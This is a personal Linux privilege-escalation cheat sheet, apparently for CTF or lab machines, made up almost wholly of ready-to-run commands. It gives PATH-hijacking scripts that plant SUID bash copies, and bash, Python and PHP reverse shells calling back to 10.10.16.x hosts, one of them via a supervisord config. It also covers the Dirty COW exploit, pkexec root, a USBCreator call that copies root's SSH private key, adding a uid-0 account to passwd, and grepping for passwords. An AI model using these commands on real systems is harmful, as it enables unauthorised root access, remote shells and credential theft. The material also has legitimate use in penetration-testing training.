---
icon: linux
---

# Linux Privilege Escalation

* ## <mark style="color:purple;">Get your own local version of this checklist</mark> [<mark style="color:orange;">`here`</mark>](https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/refs/heads/master/linux-hardening/linux-privilege-escalation-checklist.md)<mark style="color:purple;">:</mark>

{% embed url="https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist" %}
By Carlos Palop
{% endembed %}

* ## <mark style="color:purple;">Make sure you have</mark> <mark style="color:orange;">`pspy`</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">`linpeas`</mark> <mark style="color:purple;">ready:</mark>

{% embed url="https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md" %}

{% embed url="https://github.com/DominicBreuker/pspy" %}

{% hint style="info" %}
## <mark style="color:purple;">Enumeration</mark>

{% code title="Check sudo permissions" %}
```bash
sudo -l
```
{% endcode %}

{% code title="Check System info" %}
```bash
uname -a
```
{% endcode %}

{% code title="Check groups file" %}
```sh
cat /etc/group
```
{% endcode %}

{% code title="Listen to the localhost" %}
```sh
netstat -an -p tcp
```
{% endcode %}

{% code title="Check binaries with capabilities" %}
```bash
getcap -r / 2>/dev/null
```
{% endcode %}

{% code title="SUID/SETGID binaries" %}
```sh
find / -perm -4000 -or -perm -2000 2>/dev/null
```
{% endcode %}

* <mark style="color:purple;">Search for</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**the string**</mark>**&#x20;**<mark style="color:orange;">**`pass`**</mark>**&#x20;**<mark style="color:purple;">**(case-insensitive)**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">in all files and directories recursively:</mark>

```sh
grep -iR "pass" * 2>/dev/null
```

* <mark style="color:purple;">Search for</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**the string**</mark>**&#x20;**<mark style="color:orange;">**`password`**</mark> <mark style="color:purple;">in files with double extension, recursively:</mark>

```sh
grep password .*.* -r 2>/dev/null
```

### <mark style="color:purple;">Docker</mark>

{% code title="Always check the host" %}
```bash
hostname -I
```
{% endcode %}

{% code title="Check the internal network" %}
```bash
ifconfig
```
{% endcode %}

{% code title="Check mounter devices" %}
```bash
mount
```
{% endcode %}

{% code title="Check the process" %}
```bash
ps auxww | grep docker
```
{% endcode %}
{% endhint %}

***

{% hint style="info" %}
## <mark style="color:orange;">`PATH`</mark> <mark style="color:purple;">Hijacking</mark>

* <mark style="color:purple;">When a script is executed with elevated privileges (e.g., via</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">or in a</mark> <mark style="color:orange;">**`cron`**</mark> <mark style="color:purple;">job) and calls other binaries or scripts without absolute paths, it may be possible to hijack the execution flow by manipulating the</mark> <mark style="color:orange;">**`PATH`**</mark> <mark style="color:purple;">variable or exploiting relative paths.</mark>

{% code title="Check $PATH" %}
```sh
echo $PATH
```
{% endcode %}

***

### <mark style="color:orange;">`PATH`</mark> <mark style="color:purple;">Hijacking with</mark> <mark style="color:orange;">`sudo`</mark> <mark style="color:purple;">:</mark>

{% code title="Lists allowed commands" %}
```bash
sudo -l
```
{% endcode %}

* <mark style="color:purple;">Sometimes is possible to run scripts as</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">that call others scripts within the script.</mark>
* <mark style="color:purple;">When this scripts are called by a relative path is possible to create a malicious script on a directory with write permissions.</mark>
* <mark style="color:purple;">This commands creates a script named</mark> <mark style="color:orange;">**`initdb.sh`**</mark> <mark style="color:purple;">that  will copy</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">to a file in the</mark> <mark style="color:orange;">**`/tmp`**</mark> <mark style="color:purple;">folder, when called for execution:</mark>

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/shellie\nchown root:root /tmp/shellie\nchmod 6777 /tmp/shellie' | tee initdb.sh
```
{% endcode %}

* <mark style="color:purple;">Once the  malicious script is executed by the vulnerable script, you just need to execute the shell from the</mark> <mark style="color:orange;">**`/tmp`**</mark> <mark style="color:purple;">folder to become</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">:</mark>

```bash
/tmp/shellie -p
```

***

### <mark style="color:purple;">Path Hijacking in</mark> <mark style="color:orange;">`cron`</mark> <mark style="color:purple;">job:</mark>

* <mark style="color:purple;">When</mark> <mark style="color:orange;">**`PATH`**</mark> <mark style="color:purple;">includes</mark> <mark style="color:orange;">**`/usr/local/bin`**</mark> <mark style="color:purple;">before</mark> <mark style="color:orange;">**`/usr/bin`**</mark> <mark style="color:purple;">in the</mark> <mark style="color:orange;">**`cron`**</mark> <mark style="color:purple;">job's environment.</mark>&#x20;
* <mark style="color:purple;">There is an opportunity for</mark> <mark style="color:orange;">**`PATH hijacking`**</mark> <mark style="color:purple;">if a binary or script is executed</mark> <mark style="color:orange;">**`without using an absolute path`**</mark><mark style="color:purple;">**.**</mark>
* <mark style="color:purple;">By placing a malicious binary in a directory earlier in the</mark> <mark style="color:orange;">**`PATH`**</mark> <mark style="color:purple;">(e.g.,</mark> <mark style="color:orange;">**`/usr/local/bin`**</mark><mark style="color:purple;">), you can hijack the execution flow.</mark>

{% code overflow="wrap" %}
```sh
echo -e '#!/bin/bash\n\ncp /bin/bash /bin/shellie\nchmod u+s /bin/shellie' > /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts
```
{% endcode %}

* <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">drops</mark> <mark style="color:orange;">**`SUID`**</mark> <mark style="color:purple;">privileges by default, so make sure to run it with</mark> <mark style="color:orange;">**`-p`**</mark> <mark style="color:purple;">to keep root:</mark>

```bash
shellie -p
```

***

### <mark style="color:purple;">Path Hijack in</mark> <mark style="color:orange;">`supervisord.pid`</mark> <mark style="color:purple;">:</mark>

* <mark style="color:purple;">Supervisor itâ€™s a process management tool for keeping services running.</mark>
* <mark style="color:purple;">Each managed process must have a</mark> <mark style="color:orange;">**`[program:<name>]`**</mark> <mark style="color:purple;">line followed by another line</mark> <mark style="color:orange;">**`command=`**</mark> <mark style="color:purple;">where you should place the payload:</mark>

{% code overflow="wrap" %}
```bash
echo -e "[program:memcached]\ncommand = bash -c 'bash -i  >& /dev/tcp/10.10.16.6/4444 0>&1'" > memcached.ini
```
{% endcode %}

***

### <mark style="color:green;">`Python`</mark> <mark style="color:purple;">Path Hijacking</mark>

* <mark style="color:purple;">Sometimes python scripts are being executed by</mark> <mark style="color:orange;">**`cron`**</mark> <mark style="color:purple;">jobs or by other scripts with</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">permissions:</mark>

{% code title="Look for writable modules" overflow="wrap" %}
```bash
find /usr/lib/python* -type f -writable -ls 2>&1 | grep python
```
{% endcode %}

{% code title="Look in virtual environments" overflow="wrap" %}
```bash
find /path/to/venv -type f -writable -ls 2>&1 | grep python
```
{% endcode %}

{% code title="Look in the entire system" overflow="wrap" %}
```bash
find -type f -writable -ls 2>&1 | grep python
```
{% endcode %}

* <mark style="color:purple;">Check the python</mark> <mark style="color:orange;">**`PATH`**</mark> <mark style="color:purple;">order:</mark>

```bash
python -c 'import sys; print "\n".join(sys.path)'
```

* <mark style="color:purple;">Here is a example of a reverse shell to hijack the</mark> <mark style="color:orange;">**`os`**</mark> <mark style="color:purple;">module:</mark>

```bash
echo 'import pty
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.6",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()' >> os.py
```

***

### <mark style="color:orange;">`PHP`</mark> <mark style="color:purple;">Path Hijacking</mark>

* <mark style="color:purple;">Use this reverse shell to hijack</mark> <mark style="color:orange;">**`PHP`**</mark> <mark style="color:purple;">files being used with</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">privileges by a</mark> <mark style="color:orange;">**`cron`**</mark> <mark style="color:purple;">job or another script:</mark>

```php
$sock=fsockopen("10.10.16.8", 4445);
exec("/bin/sh -i <&3 >&3 2>&3");
```

***

### <mark style="color:purple;">Path Hijacking via</mark> <mark style="color:orange;">`Symlink`</mark>

```sh
ln -s /root/root.txt t.trace.db
```
{% endhint %}

***

{% hint style="danger" %}
## <mark style="color:purple;">Kernel Exploits</mark>

{% code title="Look for exploits" %}
```sh
searchsploit "Linux Kernel" | grep <version>
```
{% endcode %}

### <mark style="color:orange;">`Dirty Cow`</mark>

* #### <mark style="color:purple;">List of</mark> <mark style="color:orange;">`POCs`</mark> [<mark style="color:purple;">here</mark>](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)<mark style="color:purple;">.</mark>
* <mark style="color:purple;">**Linux kernel versions**</mark>**&#x20;**<mark style="color:orange;">**`2.6.22`**</mark>**&#x20;**<mark style="color:purple;">**to**</mark>**&#x20;**<mark style="color:orange;">**`4.8.3`**</mark>**&#x20;**<mark style="color:purple;">**(inclusive)**</mark>\
  [<mark style="color:orange;">**`dirty.c`**</mark>](https://github.com/FireFart/dirtycow/blob/master/dirty.c) <mark style="color:purple;">**POC**</mark>

{% code title="Compile it" %}
```bash
gcc -pthread dirty.c -o dirty -lcrypt; chmod +x dirty; ./dirty
```
{% endcode %}

{% code title="Log as firefart" %}
```bash
su firefart
```
{% endcode %}

```bash
ssh firefart@10.10.10.10
```
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">Dockers</mark>

* <mark style="color:purple;">Check permissions and ownership when you create a file from host and container:</mark>

```sh
touch from_host
```

```sh
touch from_container
```

* <mark style="color:purple;">If the container is miss configured and can creates files as a</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">, and you can access the files created by the host on the container:</mark>&#x20;
  1. <mark style="color:orange;">**`From the host`**</mark><mark style="color:purple;">, copy</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">in to the mounted directory.</mark>
  2. <mark style="color:orange;">**`From the container`**</mark><mark style="color:purple;">, change the ownership and permissions of</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">to</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">.</mark>
  3. <mark style="color:purple;">Execute</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">as</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">.</mark>

{% code overflow="wrap" lineNumbers="true" %}
```bash
cp /bin/bash .
chown root:root bash; chmod 4777 bash
./bash -p
```
{% endcode %}
{% endhint %}

***

{% hint style="info" %}
## <mark style="color:orange;">`Polkit`</mark>

* <mark style="color:purple;">Check the</mark> <mark style="color:orange;">**`sudoers`**</mark> <mark style="color:purple;">file:</mark>

```sh
cat /etc/sudoers
```

* <mark style="color:purple;">Check</mark> <mark style="color:orange;">**`polkit`**</mark> <mark style="color:purple;">policy:</mark>

```sh
cat /etc/polkit-1/localauthority.conf.d
```

{% code title="Become root" %}
```sh
pkexec "/bin/sh"
```
{% endcode %}

### <mark style="color:orange;">`USBCreator`</mark>

* <mark style="color:purple;">Allows to over write files with</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">permissions</mark>

{% code title="Copy root private key" overflow="wrap" %}
```sh
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/id_rsa true
```
{% endcode %}


{% endhint %}

***

{% hint style="info" %}
## <mark style="color:purple;">Important Files</mark>

### <mark style="color:orange;">`passwd`</mark>

* If is possible to write the file:

{% code title="Generate the password hash" %}
```sh
openssl passwd -1 tokyo
```
{% endcode %}

{% code title="Add the line " overflow="wrap" %}
```
echo 'tokyo:$1$iLayOiAd$8dHGiU.Qvk/uqjnoWzRpm/:0:0:pwned:/root:/bin/bash' >> passwd
```
{% endcode %}
{% endhint %}



<pre class="language-bash"><code class="lang-bash">#File
grep -ir cri-o . 2>/dev/null
<strong>#Inside a file
</strong>cat /etc/zabbix/zabbix_server.conf | grep -Ev "^#" | grep .

#Check libraries
ltrace

#Looking for 32 characters file
#hex
grep -aPo '[a-fA-F0-9]{32}' /dev/sdb
#string 32 chars
strings /dev/sdb -n 32
</code></pre>

```bash
#Interective shell
sudo -i
```

